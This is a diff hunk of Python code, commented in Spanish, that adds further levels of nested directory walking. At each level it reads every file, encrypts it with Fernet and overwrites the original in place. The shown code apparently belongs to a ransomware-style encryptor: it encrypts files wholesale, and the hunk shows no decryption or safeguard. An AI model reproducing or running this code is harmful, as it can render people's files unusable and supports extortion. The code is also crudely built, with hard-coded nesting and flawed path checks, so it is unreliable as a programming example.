@@ -178,4 +178,41 @@ for i in path:
                                                                 
                                                                 for q in list:
                                                                     dir_path = os.path.isdir(q)
+                                                                    if dir_path == True:
+                                                                        print(q)
+                                                                        list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}")
+                                                                        #novena parte de la encriptacion
+                                                                        for qq in list:
+                                                                            try:
+                                                                                with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{qq}", "rb") as file:
+                                                                                    data = file.read()
+                                                                                    file.close()
+                                                                                f = Fernet(key)
+                                                                                encry = f.encrypt(data)
+                                                                                with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{qq}", "wb") as file:
+                                                                                    file.write(encry)
+                                                                                    file.close()
+                                                                                    print(f"{qq} encriptado")
+                                                                            except:
+                                                                                print(f"{qq} No fue encriptado")
+                                                                        
+                                                                        for r in list:
+                                                                            dir_path = os.path.isdir(r)
+                                                                            if dir_path == True:
+                                                                                print(r)
+                                                                                list = os.listdir(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{r}")
+                                                                                #decima parte de la encriptacion
+                                                                                for qq in list:
+                                                                                    try:
+                                                                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{r}/{qq}", "rb") as file:
+                                                                                            data = file.read()
+                                                                                            file.close()
+                                                                                        f = Fernet(key)
+                                                                                        encry = f.encrypt(data)
+                                                                                        with open(f"{pat}/{i}/{j}/{k}/{l}/{m}/{n}/{o}/{p}/{q}/{r}/{qq}", "wb") as file:
+                                                                                            file.write(encry)
+                                                                                            file.close()
+                                                                                            print(f"{qq} encriptado")
+                                                                                    except:
+                                                                                        print(f"{qq} No fue encriptado")
  
